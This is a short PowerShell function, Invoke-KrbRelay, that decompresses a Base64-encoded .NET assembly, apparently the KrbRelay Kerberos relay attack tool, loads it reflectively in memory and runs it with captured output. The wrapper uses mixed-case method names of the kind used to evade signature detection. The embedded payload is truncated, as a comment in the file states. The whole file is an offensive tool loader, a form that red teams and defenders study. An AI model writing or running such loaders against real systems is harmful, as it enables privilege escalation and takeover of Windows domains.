function Invoke-KrbRelay
{
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAAAAAAAEAMT9CXgURfMAjM/...1lZl+eQ3gnU/b8V7//13/myV8Rr6K/+e2T+///+e//+T86f4A8AtBgA")) # NOTE: The actual 1527824-character Base64 string omitted for readability.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [KrbRelay.Program]::main([string[]]$args)
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
